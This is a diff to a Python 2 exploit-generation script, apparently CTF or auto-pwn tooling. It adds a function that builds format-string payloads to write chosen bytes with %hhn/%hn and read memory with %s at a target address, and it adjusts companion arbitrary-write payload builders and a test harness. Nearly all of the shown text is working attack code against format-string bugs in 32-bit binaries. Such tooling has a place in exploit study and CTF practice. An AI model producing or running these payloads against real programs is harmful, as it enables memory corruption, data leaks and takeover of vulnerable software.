@@ -102,8 +102,85 @@ def get_offset(binary):
     return offset
 
 
+def get_read_payload(binary, addr):
+    
+    """"
+    write:
+        [       Re        su            lt          ]:
+
+        [        ]:         Re          lt          su
+        0x5b    0x3a5d     0x6552       0x746c      0x7573
+
+        %91c    %14850c     %10997c     %3866c      %263c
+            %x$hhn    %x+1$hn     %x+2$hn      %x+3$hn      %x+4$hn
+
+        addr1    addr5       addr2       addr4      addr3
+
+        
+        addr1 = addr - len("[Result]:") = addr - 9
+        addr2 = addr - 8
+        addr3 = addr - 6
+        addr4 = addr - 4
+        addr5 = addr - 2
+
+    read:
+        %x+5$s   addr6 == addr1
+       
+    %91c    %14850c     %10997c     %3866c      %263c
+        %x$hhn    %x+1$hn     %x+2$hn      %x+3$hn      %x+4$hn        %x+5$s     addr1   addr2  ....    addr6
+
+        
+    """
+    addr = int(addr, 16)
+    offset = get_offset(binary)
+
+    if not offset:
+        return False
+
+    read_tp = """%91c%{x}$hhn%14850c%{x1}$hn%10997c%{x2}$hn%3866c%{x3}$hn%263c%{x4}$hn%{x5}$s"""
+    read_tp2 ="""{addr1}{addr2}{addr3}{addr4}{addr5}{addr6}"""
+
+    addr1 = addr - len("[Result]:")
+    addr2 = addr - 8
+    addr3 = addr - 6
+    addr4 = addr - 4
+    addr5 = addr - 2
+    addr6 = addr1
+
+    payload2 = read_tp2.format(addr1=p32(addr1), addr2=p32(addr2), addr3=p32(addr3), addr4=p32(addr4), addr5=p32(addr5), addr6=p32(addr6))
+    print repr(payload2)
+
+    old_offset = offset
+
+    while True:
+        x = str(offset)
+        x1 = str(offset + 1)
+        x2 = str(offset + 2)
+        x3 = str(offset + 3)
+        x4 = str(offset + 4)
+        x5 = str(offset + 5)
+        xlen = len(x) + len(x1) + len(x1) + len(x1) + len(x1) + len(x1)
+
+        payload1 = read_tp.format(x=x, x1=x1, x2=x2, x3=x3, x4=x4, x5=x5)
+
+        padding = (offset - old_offset) * 4  - len(payload1)
+        if padding >= 0:
+            payload = payload1 + padding * 'A' + payload2
+            print "write_payload:", repr(payload)
+            return payload
+        else:
+            offset += 1
+
+
+
+
+
+
 # not yet useful now
-def read_addr(binary, addr):
+def wrong_read_addr(binary, addr):
+
+    # write format to newaddr == addr - len(format)
+    # read the new addr
 
     import functions
     f  = functions.functions()
@@ -190,6 +267,8 @@ def read_addr(binary, addr):
 
 def write_addr_content(binary, addr, content):
 
+    addr = int(addr, 16)
+    content = int(content, 16)
     fmtpayload = ""
     offset = get_offset(binary)
     if not offset:
@@ -218,22 +297,18 @@ def get_crash_payload(binary):
 def get_write_payload(binary, addr, content):
 
     payload =  write_addr_content(binary, addr, content)
-    print ("write payload", repr(payload))
+    print "write payload", repr(payload)
     return payload
 
 
-def get_read_payload(addr):
-    pass
-
-
-
 def test():
-
     binary = os.path.join(os.path.abspath('.'), os.path.basename(sys.argv[1]))
     #read_addr(binary, 0x0804A040)
-    addr = 0x0804A040
-    content = 0x41424344
-    verify_exploit(binary) and get_write_payload(binary, addr, content) and get_read_payload(addr)
+    addr = "0x0804A040"
+    content = "0x41424344"
+    get_read_payload(binary, addr)
+
+    0 and verify_exploit(binary) and get_write_payload(binary, addr, content)
 
 
 if __name__ == '__main__':
